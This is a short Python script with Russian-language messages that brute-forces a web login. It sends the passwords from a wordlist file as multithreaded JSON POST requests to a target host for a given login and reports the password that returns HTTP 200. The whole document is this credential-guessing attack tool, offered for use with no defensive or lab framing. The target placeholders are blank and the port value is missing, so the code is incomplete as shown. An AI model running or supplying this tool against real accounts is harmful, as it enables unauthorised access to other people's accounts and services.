import requests
import threading

THREADS_NUM = 30
HOST = '...'

port = 
login = '...'

right_pass = ''
count = 1

lock = threading.Lock()

password_list = []

with open('pwlist.txt', 'r', encoding='UTF-8') as file:
    for line in file:
        password_list.append(line.removesuffix('\n'))


def check_password(pass_list):
    global count
    global right_pass
    for password in pass_list:
        json = {"login": login, "password": password}
        headers = {"Accept": "",
                   "User-Agent": ""}
        try:
            request = requests.post(url=HOST, json=json, headers=headers, timeout=10)
            if request.status_code == 200:
                right_pass = password
                return right_pass
            else:
                print('Неверный пароль: ', login, password)

        except Exception as exc:
            print(exc)
            print('\n')
        with lock:
            count += 1


threads_list = []

one_thread_check_count = len(password_list) // THREADS_NUM

for i in range(1, len(password_list) + 1, one_thread_check_count):
    threads_list.append(threading.Thread(
        target=check_password,
        args=[password_list[i:(i + one_thread_check_count)]]
    ))

for i_thread in threads_list:
    i_thread.start()

for i_thread in threads_list:
    i_thread.join()

if right_pass:
    print('Верный пароль: ', right_pass, count)
    print('Нажмите любую клавишу...')
    a = input()


